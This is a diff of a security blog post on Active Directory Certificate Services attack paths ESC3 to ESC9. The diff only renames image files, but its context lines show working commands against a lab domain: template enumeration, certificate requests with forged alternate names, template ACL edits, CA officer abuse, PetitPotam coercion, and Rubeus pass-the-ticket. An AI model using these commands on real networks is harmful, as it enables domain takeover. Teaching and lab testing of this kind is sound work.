@@ -297,15 +297,15 @@ Same situation as with Certify, only the first required template is found and fl
 ```
 certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
 ```
-<img src="/images/2022-09-16/esc3_enum1.png">  
+<img src="/images/2022-09-16/ESC3_enum1.png">  
 
 ### Exploitation
 
 Well, strange issues here again. If I happened to specify the ``onbehalfof`` parameter in both tools, I would get an error if I used ``mcafeelab.local\Administrator``. Leaving away the ``.local`` part works like a charm:  
 
-<img src="/images/2022-09-16/esc3_exploit1.png">  
+<img src="/images/2022-09-16/ESC3_exploit1.png">  
 
-<img src="/images/2022-09-16/esc3_exploit2.png">  
+<img src="/images/2022-09-16/ESC3_exploit2.png">  
 
 #### Certify  
 ```
@@ -314,9 +314,9 @@ Well, strange issues here again. If I happened to specify the ``onbehalfof`` par
 openssl pkcs12 -in cert -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx  
 .\Rubeus.exe asktgt /domain:mcafeelab.local /dc:dc2016-2.mcafeelab.local /user:Administrator /certificate:esc3_2.pfx /password:test /ptt
 ```
-<img src="/images/2022-09-16/esc3_exploit4.png">  
+<img src="/images/2022-09-16/ESC3_exploit4.png">  
 
-<img src="/images/2022-09-16/esc3_exploit3.png">  
+<img src="/images/2022-09-16/ESC3_exploit3.png">  
 
 #### Certipy  
 ```
@@ -346,14 +346,14 @@ This is abusable if we have write or full access to a template!
  .\Certify.exe find -vulnerable
  ```
 
- <img src="/images/2022-09-16/esc4_recon1.png">  
+ <img src="/images/2022-09-16/ESC4_recon1.png">  
 
 #### Certipy  
 
 ```
 certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -vulnerable 
 ```
-<img src="/images/2022-09-16/esc4_recon2.png"> 
+<img src="/images/2022-09-16/ESC4_recon2.png"> 
 
 ### Exploitation
 
@@ -378,10 +378,10 @@ Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN
 Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mcafeelab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
 
 ```
-<img src="/images/2022-09-16/esc4_exploit1.png">  
+<img src="/images/2022-09-16/ESC4_exploit1.png">  
 
 Before and after altering the cert template:  
-<img src="/images/2022-09-16/esc4_beforeafter.png">  
+<img src="/images/2022-09-16/ESC4_beforeafter.png">  
 
 ```
 # PWN
@@ -408,6 +408,8 @@ This case describes all other possible scenarios around ACLs. Which might includ
 - ACLs wrongly set somewhere up the line in AD - maybe where some set descendant rights somewhere in the config tree  
 - The CA server’s RPC/DCOM server  
 - ...  
+
+<img src="/images/2022-09-16/esc5_1.png"> 
 
 There is no direct abuse path, but you can use the before mentioned stuff as a guideline on how to proceed if this stuff here happens.  
 
@@ -504,7 +506,7 @@ $configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAut
 certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
 ```
 
-<img src="/images/2022-09-16/ESC7_exploit1.png"> 
+<img src="/images/2022-09-16/esc7_exploit1.png"> 
 
 You can now stick to [ESC6](#esc6).  
 
@@ -516,9 +518,9 @@ Certipy can be used in this scenario to give a user the ``Issue and Manage Certi
 certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -add-officer 'ds'
 ```  
 
-<img src="/images/2022-09-16/ESC7_exploit2.png">  
+<img src="/images/2022-09-16/esc7_exploit2.png">  
 
-<img src="/images/2022-09-16/ESC7_exploit3.png">  
+<img src="/images/2022-09-16/esc7_exploit3.png">  
 
 If a user has the ``Issue and Manage Certificates`` rights, he is able to approve pending requests, which allows us to "bypass" the manager approval function.  
 
@@ -530,7 +532,7 @@ If a user has the ``Issue and Manage Certificates`` rights, he is able to approv
 .\Certify.exe request /ca:'DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1' /template:"ESC7" /altname:"god" /install
 ```  
 
-<img src="/images/2022-09-16/ESC7_exploit4.png"> 
+<img src="/images/2022-09-16/esc7_exploit4.png"> 
 
 The request is pending, and we got an ID.  
 
@@ -540,7 +542,7 @@ The request is pending, and we got an ID.
 Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-PendingRequest -RequestID 731 | Approve-CertificateRequest
 ```  
 
-<img src="/images/2022-09-16/ESC7_exploit5.png">  
+<img src="/images/2022-09-16/esc7_exploit5.png">  
 
 - Fetch the now approved cert  
 
@@ -548,7 +550,7 @@ Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-PendingR
 .\Certify.exe download /ca:DC2016-2.mcafeelab.local\mcafeelab-DC2016-2-CA-1 /id:731
 ```
 
-<img src="/images/2022-09-16/ESC7_exploit6.png">  
+<img src="/images/2022-09-16/esc7_exploit6.png">  
 
 - Copy togehter your RSA private key and the cert, and generate your pfx and pwn the world.  
 
@@ -560,7 +562,7 @@ Get-CertificationAuthority -ComputerName dc2016-2.mcafeelab.local | Get-PendingR
 certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -enable-template SubCA
 ```
 
-<img src="/images/2022-09-16/ESC7_exploit7.png">  
+<img src="/images/2022-09-16/esc7_exploit7.png">  
 
 - Try to request a cert based on the SubCA template which will obviously fail. Save the private key  
 
@@ -580,7 +582,7 @@ certipy ca -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.loc
 certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -retrieve 732
 ``` 
 
-<img src="/images/2022-09-16/ESC7_exploit8.png">  
+<img src="/images/2022-09-16/esc7_exploit8.png">  
 
 <img src="/images/2022-09-16/tada_meme.png"> 
 
@@ -599,7 +601,7 @@ Suddenly coercion was a big thing again, and with the rise of PetitPotam and Co.
 .\Certify.exe cas
 ```
 
-<img src="/images/2022-09-16/ESC8_recon1.png"> 
+<img src="/images/2022-09-16/esc8_recon1.png"> 
 
 #### Certutil
 
@@ -627,11 +629,11 @@ python PetitPotam.py -u lowpriv -p low -d mcafeelab.local 10.55.0.30 10.55.0.1
 .\Rubeus.exe asktgt /user:dc2016$ /ptt /certificate:MIIRnQIBAzCCEWcGCSq<snip>
 ```
 
-<img src="/images/2022-09-16/ESC8_exploit1.png">  
+<img src="/images/2022-09-16/esc8_exploit1.png">  
 
-<img src="/images/2022-09-16/ESC8_exploit2.png">  
+<img src="/images/2022-09-16/esc8_exploit2.png">  
 
-<img src="/images/2022-09-16/ESC8_exploit3.png"> 
+<img src="/images/2022-09-16/esc8_exploit3.png"> 
 
 If you are lazy, you can try to use [Batsec's](https://twitter.com/_batsec_) [ADCSPwn](https://github.com/bats3c/ADCSPwn), which automates the whole thing.  
 <br>  
@@ -719,7 +721,7 @@ There is a new ``msPKI-Enrollment-Flag`` available:  ``CT_FLAG_NO_SECURITY_EXTEN
 certutil -dstemplate ESC9 msPKI-Enrollment-Flag
 ```
 
-<img src="/images/2022-09-16/ESC9_recon1.png">   
+<img src="/images/2022-09-16/esc9_recon1.png">   
 
 
 ESC9 is only useful when ``StrongCertificateBindingEnforcement`` is set to 1 = KDC checks if there is strong cert mapping applied to the cert. If yes it grants access. If not it checks if the cert contains the new SID extension and validates it. If check ok access is granted, otherwise declined. If the extension is completely missing, access is granted if the account requesting the cert is older than the cert.  
